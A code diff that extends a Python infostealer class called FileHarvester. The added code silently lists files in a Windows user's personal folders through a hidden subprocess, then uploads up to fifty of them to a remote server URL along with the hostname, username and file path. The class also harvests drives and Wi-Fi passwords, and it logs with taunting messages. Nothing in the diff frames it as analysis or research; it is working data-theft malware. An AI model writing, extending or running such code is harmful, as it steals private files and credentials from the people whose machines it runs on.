@@ -48,6 +48,72 @@ class FileHarvester:
                 except:
                     pass
         return drives
+    def steal_personal_folders(self):
+        personal_folders = [
+            os.path.expanduser('~\\Downloads'),
+            os.path.expanduser('~\\Desktop'),
+            os.path.expanduser('~\\Documents'),
+            os.path.expanduser('~\\Music'),
+            os.path.expanduser('~\\Pictures'),
+            os.path.expanduser('~\\Videos')
+        ]
+        stolen_files = []
+        for folder in personal_folders:
+            if os.path.exists(folder):
+                print(f"[+] Looting {folder}...")
+                try:
+                    cmd = f'dir "{folder}" /s /b'
+                    result = subprocess.check_output(cmd, 
+                                                   shell=True,
+                                                   creationflags=subprocess.CREATE_NO_WINDOW)
+                    files = result.decode('utf-8', errors='ignore').strip().split('\r\n')
+                    for file_path in files:
+                        if file_path.strip() and os.path.isfile(file_path):
+                            file_ext = os.path.splitext(file_path)[1].lower()
+                            if file_ext in self.file_types or file_ext == '':
+                                try:
+                                    file_size = os.path.getsize(file_path)
+                                    if file_size <= self.max_file_size:
+                                        stolen_files.append(file_path)
+                                        print(f"  [+] Found: {file_path}")
+                                except:
+                                    pass
+                except Exception as e:
+                    print(f"[-] Error scanning {folder}: {e}")
+        if stolen_files:
+            print(f"[+] Found {len(stolen_files)} files in personal folders")
+            self.send_files_to_server(stolen_files)
+        else:
+            print("[-] No files found in personal folders (user must be poor as fuck)")
+    def send_files_to_server(self, file_list):
+        try:
+            for file_path in file_list[:50]: 
+                try:
+                    content = self.read_file(file_path)
+                    if content:
+                        files = {
+                            'file': (os.path.basename(file_path), content, 'application/octet-stream')
+                        }
+                        data = {
+                            'path': file_path,
+                            'hostname': self.get_hostname(),
+                            'user': self.get_username(),
+                            'timestamp': time.time()
+                        }
+                        response = requests.post(f"{self.server_url}/upload_raw", 
+                                               files=files, 
+                                               data=data,
+                                               timeout=10)
+                        if response.status_code == 200:
+                            print(f"[+] Sent: {os.path.basename(file_path)}")
+                        else:
+                            print(f"[-] Failed: {os.path.basename(file_path)}")
+                        time.sleep(0.1)
+                except Exception as e:
+                    print(f"  [-] Error sending {file_path}: {e}")
+                    continue
+        except Exception as e:
+            print(f"[-] Major error in send_files_to_server: {e}")
     def collect_files(self, path):
         try:
             result = subprocess.check_output(['dir', path, '/b', '/a-d'], 
@@ -204,6 +270,8 @@ class FileHarvester:
             pass
         return wifi_passwords
     def run(self):
+        print("[+] Targeting personal folders first...")
+        self.steal_personal_folders()
         print("[+] Starting file harvesting operation...")
         drives = self.get_all_drives()
         print(f"[+] Found {len(drives)} non-system drives")
